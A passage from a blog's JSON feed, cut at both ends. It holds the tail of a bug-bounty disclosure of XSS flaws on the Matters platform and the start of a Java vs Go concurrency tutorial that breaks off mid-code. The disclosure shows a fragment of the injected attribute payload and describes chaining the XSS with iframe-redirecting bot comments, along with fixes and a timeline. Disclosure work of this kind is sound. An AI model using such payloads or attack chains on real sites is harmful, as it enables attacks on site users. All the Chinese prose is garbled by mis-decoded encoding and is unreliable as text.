class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>srcset<span class=\"token operator\">=</span><span class=\"token string\">'${src}'</span></span><span class=\"token punctuation\">\"</span></span></span><br><span class=\"token punctuation\">/></span></span></code></pre>\n<p>å¦‚æ­¤ä¸€ä¾†ï¼Œå°±è£½é€ äº†ä¸€å€‹ XSS çš„æ¼æ´ï¼š</p>\n<p><img src=\"https://i.imgur.com/nyugLUH.png\" alt=\"\"><br>\n<img src=\"https://i.imgur.com/iYLI0ku.png\" alt=\"\"></p>\n<p>ä¿®è£œæ–¹å¼ä¹Ÿæœ‰å¹¾å€‹ï¼š</p>\n<ol>\n<li>æ–°å¢ CSP header é˜»æ­¢ inline script çš„åŸ·è¡Œï¼ˆé€™æ¯”è¼ƒé›£åšåˆ°ï¼Œå› ç‚ºå¯èƒ½æœƒè·Ÿç¾æœ‰æ±è¥¿ç‰´è§¸ï¼Œéœ€è¦è¼ƒå¤šæ™‚é–“è™•ç†ï¼‰</li>\n<li>éæ¿¾å‚³é€²ä¾†çš„ img urlï¼ˆå¦‚æœéæ¿¾ä¸å¥½ä¸€æ¨£æœ‰é¢¨éšªï¼‰</li>\n<li>å…ˆæ”¹è®Š HTMLï¼Œæ‰å»å‘¼å« js-xss å¹«ä½ æ¿¾æ‰ä¸è©²å­˜åœ¨çš„å±¬æ€§</li>\n</ol>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> ç¸½çµ</h2>\n<p>æˆ‘å€‘æ‰¾åˆ°äº†å…©å€‹æ¼æ´ï¼š</p>\n<ol>\n<li>é€é <code>&lt;iframe&gt;</code> æŠŠä½¿ç”¨è€…å°åˆ°ä»»æ„ä½ç½®</li>\n<li>é€é <code>&lt;source&gt;</code> åŸ·è¡Œæ–‡ç« é é¢çš„ XSS æ”»æ“Š</li>\n</ol>\n<p>é‚£å¯¦éš›ä¸Šåˆ°åº•å¯ä»¥åšåˆ°ä»€éº¼æ¨£çš„æ”»æ“Šå‘¢ï¼Ÿ</p>\n<p>å¯ä»¥å…ˆç”¨ç¬¬äºŒå€‹æ¼æ´ç™¼è¡¨ä¸€ç¯‡æœ‰ XSS æ”»æ“Šçš„æ–‡ç« ï¼Œå†å¯«ä¸€å€‹æ©Ÿå™¨äººå»æ‰€æœ‰æ–‡ç« åº•ä¸‹ç•™è¨€ï¼Œåˆ©ç”¨ <code>&lt;iframe&gt;</code> æŠŠä½¿ç”¨è€…å°åˆ°å…·æœ‰ XSS çš„æ–‡ç« ã€‚å¦‚æ­¤ä¸€ä¾†ï¼Œåªè¦ä½¿ç”¨è€…é»æ“Šä»»ä½•ä¸€ç¯‡æ–‡ç« éƒ½æœƒè¢«æ”»æ“Šåˆ°ã€‚</p>\n<p>ä¸éç¶²ç«™æœ¬èº«å…¶ä»–åœ°æ–¹çš„é˜²ç¦¦åšå¾—ä¸éŒ¯ï¼Œå„˜ç®¡æœ‰ XSS ä½† Cookie æ˜¯ HttpOnly çš„æ‰€ä»¥å·ä¸èµ°ï¼Œä¿®æ”¹å¯†ç¢¼æ˜¯ç”¨å¯„ä¿¡çš„æ‰€ä»¥ä¹Ÿæ²’è¾¦æ³•ä¿®æ”¹å¯†ç¢¼ï¼Œä¼¼ä¹æ²’è¾¦æ³•åšåˆ°çœŸçš„å¤ªåš´é‡çš„äº‹æƒ…ã€‚</p>\n<p>è¨±å¤šéæ¿¾ XSS çš„ library æœ¬èº«æ˜¯å®‰å…¨çš„ï¼ˆé›–ç„¶æœ‰äº›æ™‚å€™å…¶å¯¦é‚„æ˜¯æœƒè¢«ç™¼ç¾<a href=\"https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss\">æ¼æ´</a>ï¼‰ï¼Œä½†ä½¿ç”¨ library çš„äººå¯èƒ½å¿½ç•¥äº†ä¸€äº›è¨­å®šæˆ–è€…æ˜¯é¡å¤–åšäº†ä¸€äº›äº‹æƒ…ï¼Œå°è‡´æœ€å¾Œç”¢ç”Ÿå‡ºä¾†çš„ HTML ä¾ç„¶æ˜¯ä¸å®‰å…¨çš„ã€‚</p>\n<p>åœ¨è™•ç†èˆ‡ä½¿ç”¨è€…è¼¸å…¥ç›¸é—œçš„åœ°æ–¹æ™‚ï¼Œæ‡‰è©²å°æ–¼æ¯ä¸€å€‹ç’°ç¯€éƒ½é‡æ–°æª¢è¦–ä¸€éï¼Œçœ‹çœ‹æ˜¯å¦æœ‰ç–å¿½çš„åœ°æ–¹ã€‚</p>\n<p>CSP çš„ header ä¹Ÿå»ºè­°è¨­å®šä¸€ä¸‹ï¼Œè‡³å°‘åœ¨çœŸçš„è¢« XSS æ™‚é‚„æœ‰æœ€å¾Œä¸€é“é˜²ç·šæ“‹ä½ã€‚é›–ç„¶èªª CSP æœ‰äº›è¦å‰‡ä¹Ÿå¯ä»¥è¢«ç¹éï¼Œä½†è‡³å°‘æ¯”ä»€éº¼éƒ½æ²’æœ‰å¥½ã€‚</p>\n<p>Matters æœ‰è‡ªå·±çš„ <a href=\"https://github.com/thematters/developer-resource/blob/master/SECURITY.md\">Bug Bounty Program</a>ï¼Œåªè¦æ‰¾åˆ°èƒ½è­‰æ˜å±å®³çš„æ¼æ´éƒ½æœ‰çé‡‘å¯ä»¥æ‹¿ï¼Œé€™ç¯‡æ‰¾åˆ°çš„ XSS æ¼æ´è¢«æ­¸é¡åœ¨ Highï¼Œåƒ¹å€¼ 150 å…ƒç¾é‡‘ã€‚ä»–å€‘åœ˜éšŠç›¸ä¿¡é–‹æºèƒ½æƒ åŠæŠ€è¡“äººå“¡ï¼Œä¹Ÿèƒ½è®“ç¶²ç«™æ›´å®‰å…¨ï¼Œå› æ­¤å¸Œæœ›å¤§å®¶çŸ¥é“é€™å€‹è¨ˆç•«çš„å­˜åœ¨ã€‚</p>\n<p>æœ€å¾Œï¼Œæ„Ÿè¬ Matters åœ˜éšŠå¿«é€Ÿçš„å›è¦†ä»¥åŠè™•ç†ï¼Œä¹Ÿæ„Ÿè¬ Cymetrics çš„åŒäº‹å€‘ã€‚</p>\n<p>æ™‚é–“è»¸ï¼š</p>\n<ul>\n<li>2021â€“05â€“07 å›å ±æ¼æ´</li>\n<li>2021â€“05â€“12 æ”¶åˆ° Matters åœ˜éšŠç¢ºèªä¿¡ï¼Œæ­£åœ¨ä¿®è£œæ¼æ´</li>\n<li>2021â€“05â€“12 è©¢å•ä¿®è£œå®Œæ˜¯å¦èƒ½ç™¼è¡¨æ–‡ç« ï¼Œç²å¾—è¨±å¯</li>\n<li>2021â€“05â€“13 ä¿®å¾©å®Œæˆ</li>\n</ul>\n",
      "date_published": "2021-05-15T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable-zh/",
      "url": "https://tech-blog.cymetrics.io/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable-zh/",
      "title": "æ¯”è¼ƒ Java å’Œ Golang åœ¨æ’°å¯«ä½µç™¼æ™‚è™•ç†å…±äº«è®Šæ•¸çš„å·®ç•°",
      "content_html": "<!-- summary -->\n<p>åœ¨å¯« concurrency ç¨‹å¼æ™‚ï¼Œé€šå¸¸æœƒç”¨ lockã€synchronized ç­‰æ©Ÿåˆ¶ä¿è­·å­˜å–å…±äº«è³‡æºçš„ç¨‹å¼ç‰‡æ®µï¼Œç¢ºä¿ä¸€æ¬¡åªæœ‰ä¸€å€‹ thread å¯ä»¥ä½¿ç”¨é€™äº›å…±äº«è³‡æºã€‚</p>\n<p>ä½†è‹¥æ˜¯å…±äº«è³‡æºä¸æ˜¯ä¸€å€‹ç¨‹å¼ç‰‡æ®µè€Œåƒ…åƒ…åªæ˜¯ä¸€å€‹è®Šæ•¸ï¼Œä½¿ç”¨ lockã€synchronized ç­‰æ©Ÿåˆ¶å°±æœƒé¡¯å¾—å¤ªç¬¨é‡ï¼Œç”šè‡³æ‹–æ…¢æ•ˆèƒ½ã€‚</p>\n<!-- summary -->\n<p>ä»¥ä¸‹é¢çš„ Golang ç¨‹å¼ä¾†èªªï¼š</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">BenchmarkLocke</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>B<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> n <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> b<span class=\"token punctuation\">.</span>N<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\ta <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><br>\t\t<span class=\"token keyword\">var</span> l sync<span class=\"token punctuation\">.</span>Mutex<br>\t\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t\tl<span class=\"token punctuation\">.</span><span class=\"token function\">Lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t\t\ta<span class=\"token operator\">++</span><br>\t\t\tl<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>profiling é€™æ®µç¨‹å¼ä»¥å¾Œæœƒç™¼ç¾ CPU æ™‚é–“å¹¾ä¹éƒ½èŠ±åœ¨ Lock ä¸Šé¢ï¼Œä¸‹ç‚º profiling çµæœï¼š</p>\n<p><img src=\"/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/lock-profiling.png\" alt=\"\"></p>\n<p>ç‚ºäº†æå‡æ•ˆèƒ½ï¼Œä¿è­·å–®ä¸€è®Šæ•¸åœ¨å¤šå€‹ thread å…±ç”¨æœƒç”¨ lock-free ç­‰æ‰‹æ³•ã€‚  è€Œåœ¨æ’°å¯« concurrency code è™•ç†å…±äº«è®Šæ•¸å•é¡Œæ™‚ï¼Œæœ‰ä¸‰ä»¶äº‹è¦æ³¨æ„ï¼šåŸå­æ€§ (atomicity)ã€å¯è¦‹æ€§ (visibility) ä»¥åŠæœ‰åºæ€§ (ordering)ã€‚</p>\n<p>æœ¬æ–‡å°±é€™ä¸‰å€‹è­°é¡Œï¼Œåˆ†åˆ¥æ¢è¨ Java å’Œ Golang æä¾›é‚£äº›æ©Ÿåˆ¶ä¾†è™•ç†ï¼Œåœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘å€‘å…ˆä»‹ç´¹ä¸€ä¸‹é€™ä¸‰å€‹è­°é¡Œï¼š</p>\n<h2 id=\"%E5%8E%9F%E5%AD%90%E6%80%A7\"><a class=\"direct-link\" href=\"#%E5%8E%9F%E5%AD%90%E6%80%A7\">#</a> åŸå­æ€§</h2>\n<p>å…±ç”¨è®Šæ•¸çš„æ“ä½œéœ€ç¢ºä¿ä¸æœƒè¢«ä¸­æ–·ã€‚ä¸€è¡Œç¨‹å¼ç¢¼å¯èƒ½ç”±å¤šå€‹ cpu æŒ‡ä»¤çµ„æˆï¼Œä¾‹å¦‚èªª i++ï¼Œå°±æ˜¯ç”±<strong>å¾è®Šæ•¸å–å€¼</strong>ï¼Œ<strong>å€¼åŠ ä¸€</strong>ï¼Œ<strong>è³¦å€¼å›è®Šæ•¸</strong>ä¸‰å€‹ cpu æŒ‡ä»¤ã€‚è‹¥æ˜¯å…©å€‹ thread åŒæ™‚åŸ·è¡Œ i++ æ™‚ï¼Œcpu æŒ‡ä»¤åŸ·è¡Œé †åºå¯èƒ½æ˜¯é€™æ¨£äº¤éŒ¯åŸ·è¡Œï¼š</p>\n<pre><code>thread1 è®€å€¼ 100  \nthread2 è®€å€¼ 100  \nthread1 åŠ ä¸€ 101  \nthread2 åŠ ä¸€ 101  \nthread1 è³¦å€¼ 101  \nthread2 è³¦å€¼ 101\n</code></pre>\n<p>å› æ­¤æœƒå¾—åˆ°ä¸€å€‹éŒ¯èª¤çš„çµæœï¼Œi=101ã€‚</p>\n<p>ä¸€å€‹ç°¡å–®çš„ java ç¯„ä¾‹å¦‚ä¸‹</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Atomic</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">int</span> times <span class=\"token operator\">=</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token class-name\">ExecutorService</span> executorService <span class=\"token operator\">=</span> <span class=\"token class-name\">Executors</span><span class=\"token punctuation\">.</span><span class=\"token function\">newFixedThreadPool</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">Counter</span> counter <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Counter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>times<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            executorService<span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>                counter<span class=\"token punctuation\">.</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">20000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        executorService<span class=\"token punctuation\">.</span><span class=\"token function\">shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>counter<span class=\"token punctuation\">.</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Counter</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>ç¬¬ 16 è¡Œé æœŸæ‡‰è©²é¡¯ç¤º 100000ï¼Œä½†å¯¦éš›åŸ·è¡Œå¾€å¾€å°‘æ–¼ 100000ã€‚é€™å°±æ˜¯å› ç‚ºå…±äº«è®Šæ•¸çš„å­˜å–æ²’æœ‰ä¿æŒä¸€è‡´æ€§å°è‡´çš„ã€‚</p>\n<h2 id=\"%E5%8F%AF%E8%A6%8B%E6%80%A7\"><a class=\"direct-link\" href=\"#%E5%8F%AF%E8%A6%8B%E6%80%A7\">#</a> å¯è¦‹æ€§</h2>\n<p>åœ¨å¤šæ ¸ç’°å¢ƒï¼Œæ¯å€‹ CPU éƒ½æœƒæœ‰å°ˆå±¬è‡ªå·±çš„ cacheï¼ŒåŸæœ¬çš„ç”¨æ„æ˜¯ç”¨ä¾†æ¸›å°‘ç›´æ¥è·Ÿ memory æºé€šçš„æ¬¡æ•¸ä»¥æå‡æ•ˆèƒ½ã€‚ä¸‹åœ–å³ç‚ºä¸€å€‹ç°¡å–®çš„ cpuæ¶æ§‹ç¤ºæ„åœ–ã€‚</p>\n<p><img src=\"/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/cpu-architecture.png\" alt=\"\"></p>\n<p>é€™æ­¤æ¶æ§‹ä¸‹ï¼ŒåŒä¸€å€‹è®Šæ•¸å¯èƒ½å­˜åœ¨å¤šå€‹ cpu å¿«å–ä¸­ï¼Œè‹¥æ˜¯ cpu1 æ›´æ–°äº†è®Šæ•¸è€Œ cpu2 æ¯«ç„¡æ‰€çŸ¥çš„è©±ï¼Œcpu2 ä¸Šçš„ thread å°±æœƒä¸€ç›´ä½¿ç”¨èˆŠçš„å€¼ã€‚<br>\nä¸‹é¢æ˜¯ä¸€æ®µ java ç¯„ä¾‹ï¼š</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">Flag</span> flag <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token comment\">// do nothing</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">Thread</span> t2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        flag<span class=\"token punctuation\">.</span>bool <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    t2<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Unreachable\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">boolean</span> bool <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>å³ä½¿ thread 2 å·²ç¶“å°‡ flag æ›´æ–°ç‚º falseï¼Œä½† thread 1 ä»æœ‰ä¸€å®šæ©Ÿç‡æœƒä¸€ç›´å¡åœ¨ for loop ç„¡æ³•é€ƒè„«ï¼Œå› ç‚º thread 1 æ²’çœ‹åˆ° thread 2 å° flag çš„æ›´æ–°ã€‚</p>\n<h2 id=\"%E6%9C%89%E5%BA%8F%E6%80%A7\"><a class=\"direct-link\" href=\"#%E6%9C%89%E5%BA%8F%E6%80%A7\">#</a> æœ‰åºæ€§</h2>\n<p>ç·¨è­¯å™¨åœ¨æŠŠç¨‹å¼ç¢¼è½‰æˆ cpu æŒ‡ä»¤çš„æ™‚å€™æœ‰æ™‚æœƒå› ç‚ºæ•ˆèƒ½å› ç´ é‡æ’æŒ‡ä»¤ï¼Œé€™æœƒå°è‡´å¯¦éš› cpu åŸ·è¡ŒæŒ‡ä»¤çš„é †åºå’Œä½ æƒ³åƒçš„ä¸å¤ªä¸€æ¨£ã€‚ä¾‹å¦‚ä¸‹é¢ä¸‰è¡Œ codeï¼š</p>\n<pre class=\"language-text\"><code class=\"language-text\">a = 1  <br>b = 2  <br>c = a + b</code></pre>\n<p>ç¬¬ä¸‰è¡Œç›¸ä¾å‰å…©è¡Œ codeï¼Œå› æ­¤ compile åªæœƒä¿è­‰å‰å…©è¡Œåœ¨ç¬¬ä¸‰è¡Œå‰åŸ·è¡Œï¼Œäº¦å³mæ˜¯å¯¦éš›ä¸ŠåŸ·è¡Œé †åºå¯èƒ½æœƒæ˜¯</p>\n<pre class=\"language-text\"><code class=\"language-text\">b = 2  <br>a = 1  <br>c = a + b</code></pre>\n<p>é€™åœ¨ signle thread æ˜¯æ²’å•é¡Œçš„ï¼Œä½†åœ¨ multi thread æƒ…æ³ä¸‹äº‚åºå¯èƒ½æœƒé€ æˆä½ ç„¡æ³•ç†è§£çš„ bugã€‚ä»¥ä¸‹æ˜¯ä¸€å€‹ç°¡å–®çš„ Java code ç¯„ä¾‹ï¼š</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> a<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>            a<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span><br>            b<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b<span class=\"token operator\">==</span><span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> a<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token class-name\">String</span> err <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%th round, Non thread safe!\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>æ˜¯å¾ˆæœ‰å¯èƒ½é€²å…¥é€²å…¥ 12~16 è¡Œçš„ if condition çš„ï¼Œå› ç‚ºå° thread t1 è€Œè¨€ a=2 å’Œ b=1 å…©ä»¶äº‹æ²’æœ‰ happen-before é—œä¿‚ï¼Œæ‰€ä»¥ä¸æœƒä¿è­‰é †åºã€‚</p>\n<p>ä¸Šé¢æåˆ°çš„ä¸‰å€‹ concurrency å•é¡Œï¼Œå…¶ä¸­å¯è¦‹æ€§ (visibility) å’Œæœ‰åºæ€§(ordering) é€šå¸¸ä¸€èµ·é€šç¨±ç‚º <a href=\"https://en.wikipedia.org/wiki/Happened-before\">happen-before</a> åŸå‰‡ã€‚</p>\n<p>åœ¨å¯¦ä½œ singleton æ¨¡å¼æ™‚å¸¸ä½¿ç”¨ â€œDouble-checked lockingâ€ ä¾†å„ªåŒ–æ•ˆèƒ½ï¼Œæ­¤æ™‚è‹¥æ²’æœ‰æ„è­˜åˆ° happen-before ä¾¿æœƒé‡åˆ°å•é¡Œï¼šå³ä½¿ singleton ç‰©ä»¶éç‚º null ä¹Ÿä¸ä¿è­‰è©²ç‰©ä»¶è™•æ–¼åˆå§‹åŒ–å®Œæˆçš„ç‹€æ…‹ï¼Œå› æ­¤æœ‰å¯èƒ½æœƒè®“ç³»çµ±ç•°å¸¸ï¼Œå¯åƒè€ƒ wiki å°æ­¤ç•°å¸¸çš„<a href=\"https://zh.wikipedia.org/wiki/%E5%8F%8C%E9%87%8D%E6%A3%80%E6%9F%A5%E9%94%81%E5%AE%9A%E6%A8%A1%E5%BC%8F\">æè¿°æ–‡ç« </a>ã€‚</p>\n<p>æ¥ä¸‹ä¾†çœ‹çœ‹ Java å’Œ Golang æ€éº¼è™•ç†é€™äº›å•é¡Œã€‚</p>\n<h1 id=\"java\"><a class=\"direct-link\" href=\"#java\">#</a> Java</h1>\n<h2 id=\"java-%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E5%8E%9F%E5%AD%90%E6%80%A7%EF%BC%9F\"><a class=\"direct-link\" href=\"#java-%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E5%8E%9F%E5%AD%90%E6%80%A7%EF%BC%9F\">#</a> Java å¦‚ä½•è™•ç†åŸå­æ€§ï¼Ÿ</h2>\n<p>Java åœ¨ java.util.concurrent.atomic è£¡é¢æä¾›äº†åŸå­æ€§æ“ä½œç›¸é—œçš„ tool kitï¼Œç”¨ä¾†ä¿è­‰è®Šæ•¸çš„æ“ä½œã€‚ä¾‹å¦‚å¯ä»¥ç”¨ <strong>AtomicInteger</strong> ä¾†è™•ç†å°å…±äº«è®Šæ•¸çš„æ“ä½œï¼Œå¦‚æ­¤å³å¯ä¿è­‰åŸå­æ€§ä¸è¢«ç ´å£ï¼Œå¾—åˆ°æ­£ç¢ºçš„çµæœï¼Œä¿®æ”¹éå¦‚ä¸‹</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> times <span class=\"token operator\">=</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">ExecutorService</span> executorService <span class=\"token operator\">=</span> <span class=\"token class-name\">Executors</span><span class=\"token punctuation\">.</span><span class=\"token function\">newFixedThreadPool</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span 